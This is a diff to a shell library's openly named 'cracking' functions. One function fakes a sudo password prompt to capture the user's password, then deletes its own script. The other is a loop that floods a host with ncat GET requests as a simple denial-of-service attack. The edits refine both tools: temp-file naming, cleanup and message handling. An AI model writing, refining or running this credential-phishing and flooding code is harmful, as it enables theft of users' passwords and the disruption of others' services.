@@ -81,7 +81,8 @@ bl_cracking_grab_sudo_password() {
     '
     local password
     local user="$(whoami)"
-    local buffer_file_path="$(mktemp)"
+    local buffer_file_path="$(
+        mktemp --suffix -bashlink-cracking-grap-sudo-password)"
     for number in 1 2 3; do
         read -rsp "[sudo] password for $user: " password
         bl.logging.plain
@@ -95,14 +96,13 @@ bl_cracking_grab_sudo_password() {
             rm "$(readlink --canonicalize "$0")" &>/dev/null
             bl.logging.cat "$buffer_file_path"
             break
+        elif (( number == 3 )); then
+            bl.logging.plain "sudo: $number incorrect password attempts"
         else
-            if (( number == 3 )); then
-                bl.logging.plain "sudo: $number incorrect password attempts"
-            else
-                bl.logging.plain Sorry, try again.
-            fi
+            bl.logging.plain Sorry, try again.
         fi
     done
+    rm "$buffer_file_path" &>/dev/null
 }
 alias bl.cracking.make_simple_ddos_attach=bl_cracking_make_simple_ddos_attack
 bl_cracking_make_simple_ddos_attack() {
@@ -116,8 +116,8 @@ bl_cracking_make_simple_ddos_attack() {
     '
     local index
     for (( index=0; index<"$1"; index++ )); do
-        # shellcheck disable=SC1117
-        bl.logging.plain "GET /$index\r\n\r\n" | ncat lilu "$2" &
+        # shellcheck disable=SC1117,SC2028
+        echo "GET /$index\r\n\r\n" | ncat lilu "$2" &
     done
     return $?
 }
